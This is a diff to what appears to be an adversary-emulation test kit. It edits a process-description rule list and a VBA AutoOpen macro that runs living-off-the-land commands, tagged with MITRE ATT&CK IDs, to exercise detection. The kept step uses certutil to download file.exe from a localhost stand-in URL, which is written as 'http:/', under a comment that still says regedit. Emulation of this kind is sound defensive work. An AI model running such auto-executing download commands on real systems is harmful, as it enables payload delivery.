@@ -409,8 +409,7 @@ Rule {
 			Include DESCRIPTION {-v "COM Surrogate"}
 			#svchost.exe
 			Include DESCRIPTION {-v "Host Process for Windows Services"}
-			#regsvr32.exe
-			Include DESCRIPTION {-v "Microsoft(C) Register Server"}
+
 			#bitsadmin.exe
 			Include DESCRIPTION {-v "BITS administration utility"}
 			
@@ -454,21 +453,10 @@ Public Sub AutoOpen()
     objWshell1.Exec (psString)
 
 
-
-
-  '3 - VBA Launching regedit for execution or persistence
-    psString = "regedit /E c:\fakefile.reg NOWHERE"
-        
-    MsgBox ("3 - regedit.exe " + Chr(13) & Chr(10) + "MITRE ATT&CK: T1096" + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10) + "NOTE: you will see an error!")
-    objWshell1.Exec (psString)
-
-
-
-
-  '4 - VBA Launching regedit for execution
+  '3 - VBA Launching regedit for execution
     psString = "certutil.exe -urlcache -split -f http:/127.0.0.1/file file.exe"
         
-    MsgBox ("4 - certutil " + Chr(13) & Chr(10) + "MITRE ATT&CK: T1105 " + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10) + "NOTE: you will see an error!")
+    MsgBox ("3 - certutil " + Chr(13) & Chr(10) + "MITRE ATT&CK: T1105 " + Chr(13) & Chr(10) + Chr(13) & Chr(10) + "Command: " + psString + Chr(13) & Chr(10) + "NOTE: you will see an error!")
     objWshell1.Exec (psString)
     
     
